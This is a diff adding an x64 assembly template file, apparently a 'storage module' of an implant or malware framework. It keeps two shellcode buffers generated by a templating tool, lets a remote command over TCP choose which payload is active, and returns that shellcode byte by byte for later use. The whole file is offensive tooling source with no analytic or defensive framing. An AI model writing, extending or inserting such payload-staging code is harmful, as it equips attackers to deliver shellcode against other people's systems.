@@ -1,0 +1,163 @@
+#!name##ZAX_STORAGE
+#!types##sfile
+#!info##Zaxxon storage module
+
+extern atoi
+
+%define STORAGE_SCODE_BUFF {{ZAX_sc_buff}} ; buffer for shellcode
+
+section .data
+{{TOOL.build_asm_scvar(ZAX_scode_text, ZAX_sc1, "zst_1s", "zst_1sv_all", "x64", True)}}
+;;;;;;;;;;;;;;;;;
+{{TOOL.build_asm_scvar(ZAX_scode_text, ZAX_sc2, "zst_2s", "zst_2sv_all", "x64", True)}}
+
+    zst_text_cscode: db "Change option successfull", 10, 0
+
+section .bss
+    zst_player1: resb STORAGE_SCODE_BUFF    ; shellcode buffer 1
+    zst_player2: resb STORAGE_SCODE_BUFF    ; shellcode buffer 2
+    zst_player_id: resq 1   ; buffer for shellcode index
+    zst_player_work: resq 1 ; pointer to list with shellcode
+
+    
+
+
+section .text
+
+ZST_Init:
+; Initialize storage module
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    sub rsp, 40
+    mov rcx, 1
+    call ZST_get_set   
+    add rsp, 40
+    
+    
+    add rsp, 8
+    pop rbp
+    ret
+
+ZST_set:
+; set shellcode to work
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - args struct (4 * 8 bytes)
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 48
+    mov rbx, rcx
+    mov rcx, [rbx+8]    ; get 2nd arg
+    call atoi
+    mov rcx, rax
+    call ZST_get_set
+    mov rcx, zst_text_cscode
+    call TCP_send
+    add rsp, 48
+   
+    
+    pop rbp
+    ret
+
+ZST_get:
+; get shellcode byte from storage. Return one byte till get 0
+; REQUIREMENTS: stack allign to 16
+; OUT: rax - shellcode byte or 0
+    push rbp
+    mov rbp, rsp
+    push rsi
+    push rdi
+    push rcx
+    push rbx  
+    
+    lea rsi, [zst_player_work]
+    mov rsi, [rsi]
+    lea rdi, [zst_player_id]
+    mov rdi, [rdi]
+    xor rax, rax    ; temp
+    xor rcx, rcx    ; var index
+    mov rbx, [rsi + 8 * rdi]    ; get next item from list  
+    cmp rbx, 0  ; check is list end
+    je .code_end
+    
+    .get_byte:
+        mov byte al, [rbx + rcx]
+        cmp al, 0
+        je .return
+        cmp al, 10
+        je .return_byte
+        inc rcx
+        jmp .get_byte
+    
+    .return:
+        pop rbx
+        pop rcx
+        pop rdi
+        pop rsi
+        pop rbp
+        ret
+
+    .return_byte:
+        mov byte al, [rbx + rcx + 1]    ; get shellcode byte
+        inc rdi     ; list index + 1
+        lea rbx, [zst_player_id]
+        mov qword [rbx], rdi    ; update list index
+        jmp .return
+    
+    .code_end:
+        xor rax, rax    ; reutrn 0
+        jmp .return
+
+
+
+ZST_get_set:
+; set pointer to shellcode
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - number 1 or 2
+    push rbp
+    mov rbp, rsp
+    
+    ;check first
+    cmp rcx, 1
+    je .set_first
+    
+    cmp rcx, 2
+    je .set_second
+   
+    .return:
+        pop rbp
+        ret      
+    .set_first:
+        lea rax, [zst_player_id]
+        mov qword [rax], 0
+        lea rax, [zst_player_work]
+        lea rbx, [zst_1sv_all]
+        mov [rax], rbx
+        jmp .return
+    .set_second:
+        lea rax, [zst_player_id]
+        mov qword [rax], 0
+        lea rax, [zst_player_work]
+        lea rbx, [zst_2sv_all]
+        mov [rax], rbx
+        jmp .return
+    
+
+ZST_get_reset:
+; reset buffer shellcode index and pointer
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    
+    lea rax, [zst_player_id]
+    mov qword [rax], 0
+    lea rax, [zst_player_work]
+    mov qword [rax], 0
+    
+    pop rbp
+    ret
+
+
